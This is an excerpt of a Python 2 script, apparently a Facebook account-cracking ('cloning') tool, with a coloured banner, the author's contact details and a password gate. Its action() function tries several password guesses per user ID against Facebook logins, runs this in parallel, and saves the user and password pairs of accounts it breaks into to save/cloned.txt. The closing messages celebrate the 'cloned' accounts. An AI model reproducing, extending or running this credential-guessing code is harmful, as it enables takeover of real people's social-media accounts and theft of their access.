...
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;91mBOLANIBALOCHâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
...
▒█▄▄▀ ▒█▄▄▄ ▒█░▒█ ▒█▄▄▀
 ...
 \033[1;96m      \x1b[1;95mWhatsap Number +923183700115
\x1b[1;91mFacebook Zulfiqar Baloch
"""\x1b[1;93mFrome Balochistan quetta
...
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;92mPASSWORD \x1b[1;91m: ")
...
def action():
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;95m(BOLANI_CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;95m(BOLANI_CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;96m(BOLANI_CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;96m(BOLANI_CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
    ...
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'BOLANI ENJOY Process Has Been Completedâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’...100%'
    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('BOLANI BALOCH Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your BOLANI(CP)Accounts Open after 8 to 12 days")
    print ''
    print """
...
\033[1;91mThanks \033[1;97mUseing My BOLANI TIRCKER Tool
"""
